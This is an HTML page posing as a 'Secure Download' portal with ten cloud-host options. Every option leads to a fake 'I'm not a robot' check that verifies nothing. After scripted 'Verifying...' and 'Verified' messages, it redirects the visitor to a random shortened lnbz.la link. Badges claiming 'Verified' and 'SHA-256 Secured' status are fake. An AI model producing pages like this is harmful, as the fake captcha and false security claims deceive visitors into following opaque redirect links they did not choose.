<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Link Option • Secure Download</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: #0a0a0f;
      color: #e2e8f0;
    }
    .glass {
      background: rgba(30, 30, 50, 0.45);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border: 1px solid rgba(100, 116, 139, 0.25);
      border-radius: 1rem;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35);
    }
    .card-hover:hover {
      transform: translateY(-4px);
      box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.5);
      border-color: rgba(59, 130, 246, 0.4);
    }
    .btn-primary {
      background: linear-gradient(135deg, #3b82f6, #6366f1);
    }
    .btn-primary:hover {
      background: linear-gradient(135deg, #2563eb, #4f46e5);
    }
  </style>
</head>
<body class="min-h-screen">

  <!-- Header -->
  <header class="fixed top-0 left-0 right-0 z-50 glass border-b border-slate-800/50">
    <div class="max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
      <div class="flex items-center gap-3">
        <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-blue-600 to-indigo-600 flex items-center justify-center text-white font-bold text-xl shadow-lg">
          LO
        </div>
        <span class="text-2xl font-semibold tracking-tight">Link Option</span>
      </div>
      <div class="flex items-center gap-3 text-sm text-slate-400">
        <span class="inline-flex items-center gap-1.5">
          <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
          Secure
        </span>
      </div>
    </div>
  </header>

  <main class="pt-28 pb-20 px-6 max-w-7xl mx-auto">
    <!-- Hero -->
    <div class="text-center mb-16">
      <div class="inline-flex items-center gap-2 px-5 py-2 glass rounded-full text-sm text-slate-300 mb-6">
        <i class="fa-solid fa-shield-halved text-emerald-500"></i>
        Verified • 1.2 GB • SHA-256 Secured
      </div>
      <h1 class="text-4xl md:text-5xl font-bold tracking-tight mb-4">
        Select Option
      </h1>
      <p class="text-lg text-slate-400 max-w-2xl mx-auto">
        Link Valid for 24hrs
      </p>
    </div>

    <!-- Provider Cards -->
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-6">
      <!-- Cards generated in JS -->
    </div>
  </main>

  <!-- Captcha Modal -->
  <div id="captchaModal" class="hidden fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center p-4">
    <div class="glass w-full max-w-md rounded-2xl overflow-hidden shadow-2xl">
      <div class="px-8 py-6 border-b border-slate-700/50 flex items-center justify-between">
        <h3 class="text-xl font-semibold text-white">Security Verification</h3>
        <button onclick="closeModal()" class="text-slate-400 hover:text-white text-2xl transition">×</button>
      </div>

      <div class="p-10 text-center">
        <div class="mx-auto w-20 h-20 rounded-full bg-slate-800/50 flex items-center justify-center mb-6">
          <i class="fa-solid fa-shield-halved text-4xl text-blue-500"></i>
        </div>

        <h4 class="text-2xl font-semibold mb-3">Please verify you're human</h4>
        <p class="text-slate-400 mb-8 text-sm">
          This quick check helps us keep the platform safe.
        </p>

        <div onclick="startVerification()" id="recapArea"
             class="glass cursor-pointer p-6 rounded-xl flex items-center justify-center gap-4 hover:border-blue-500/40 transition-all">
          <input type="checkbox" id="recapCheck" class="w-6 h-6 rounded accent-blue-600">
          <label for="recapCheck" class="text-lg cursor-pointer text-slate-200">I'm not a robot</label>
        </div>

        <div id="loading" class="hidden mt-10 flex flex-col items-center gap-4">
          <div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          <p class="text-slate-400">Verifying...</p>
        </div>

        <div id="success" class="hidden mt-10 text-xl font-semibold text-emerald-400">
          ✓ Verified — Moving to Download folder...
        </div>
      </div>

      <div class="px-8 py-6 border-t border-slate-700/50 text-right">
        <button onclick="closeModal()" class="px-6 py-3 text-slate-400 hover:text-white transition">Cancel</button>
      </div>
    </div>
  </div>

<script>
// All your links (paste the full list here)
const links = [
  "https://lnbz.la/0AC6","https://lnbz.la/0dQJf","https://lnbz.la/0IPJ","https://lnbz.la/0ssnE","https://lnbz.la/0ug",
  "https://lnbz.la/1F6lg","https://lnbz.la/1S6lQX","https://lnbz.la/1yXvSV","https://lnbz.la/1zUjJnN","https://lnbz.la/21mKYE",
  // ... paste ALL remaining links from your earlier message ...
  "https://lnbz.la/ZVvg"
];

const providers = [
  { name: "GDFlix", icon: "fa-cloud-arrow-down", color: "blue" },
  { name: "HubCloud", icon: "fa-cloud", color: "sky" },
  { name: "KatDrive", icon: "fa-rocket", color: "purple" },
  { name: "Send.cm", icon: "fa-paper-plane", color: "emerald" },
  { name: "Indishare", icon: "fa-bolt", color: "red" },
  { name: "1fichier", icon: "fa-box-archive", color: "orange" },
  { name: "Mega", icon: "fa-cloud-download", color: "teal" },
  { name: "MediaFire", icon: "fa-fire", color: "amber" },
  { name: "pCloud", icon: "fa-cloud-upload", color: "indigo" },
  { name: "Rapidgator", icon: "fa-gauge-high", color: "pink" }
];

function createProviders() {
  const container = document.querySelector(".grid");
  container.innerHTML = "";

  providers.forEach(p => {
    const card = document.createElement("div");
    card.className = `glass p-8 text-center cursor-pointer card-hover transition-all duration-300`;
    card.innerHTML = `
      <div class="w-16 h-16 mx-auto mb-6 rounded-full bg-slate-800/50 flex items-center justify-center">
        <i class="fa-solid ${p.icon} text-3xl text-${p.color}-500"></i>
      </div>
      <h3 class="text-xl font-semibold mb-2">${p.name}</h3>
      <p class="text-sm text-slate-400 mb-6">Folder</p>
      <button onclick="startCaptcha()" 
              class="w-full py-4 btn-primary text-white font-medium rounded-xl shadow-lg transition-all">
        Proceed
      </button>
    `;
    container.appendChild(card);
  });
}

function startCaptcha() {
  document.getElementById("captchaModal").classList.remove("hidden");
  document.getElementById("recapArea").style.display = "flex";
  document.getElementById("loading").classList.add("hidden");
  document.getElementById("success").classList.add("hidden");
  document.getElementById("recapCheck").checked = false;
}

function startVerification() {
  if (!document.getElementById("recapCheck").checked) return;

  document.getElementById("recapArea").style.display = "none";
  document.getElementById("loading").classList.remove("hidden");

  setTimeout(() => {
    document.getElementById("loading").classList.add("hidden");
    document.getElementById("success").classList.remove("hidden");

    setTimeout(() => {
      const randomLink = links[Math.floor(Math.random() * links.length)];
      window.location.href = randomLink || "https://lnbz.la/0AC6";
    }, 1400);
  }, 1800);
}

function closeModal() {
  document.getElementById("captchaModal").classList.add("hidden");
}

// Initialize
createProviders();
</script>
</body>
</html>
